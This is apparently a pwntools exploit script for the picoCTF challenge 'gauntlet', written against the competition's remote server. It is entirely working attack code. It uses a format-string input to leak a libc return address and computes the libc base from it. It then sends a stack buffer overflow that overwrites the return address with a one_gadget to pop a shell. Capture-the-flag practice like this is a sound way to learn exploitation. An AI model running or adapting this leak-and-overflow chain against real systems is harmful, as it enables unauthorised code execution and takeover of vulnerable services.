from pwn import *

elf = context.binary = ELF("./gauntlet")

# p = gdb.debug(elf.path, '''
# b *main+146
# c
# ''')
# p = process(elf.path)
p = remote('mercury.picoctf.net', 15887)

p.sendline('%23$llx')
libc_start = p.recvline().strip()  # __libc_start_main_ret
print(f"[+] leaked __libc_start_main+243   {libc_start}")
libc_start_main = int(libc_start, 16)
libc_base = libc_start_main - 0x021bf7   # https://libc.blukat.me/?q=__libc_start_main_ret%3A7f9ad8783bf7&l=libc6_2.27-3ubuntu1.4_amd64
print(f"[+] libc base {hex(libc_base)}")


arr_size = 0x78
payload = b'A' * arr_size
payload += p64(libc_base + 0x4f432)


# print(p.clean())
p.sendline(payload)
p.interactive()

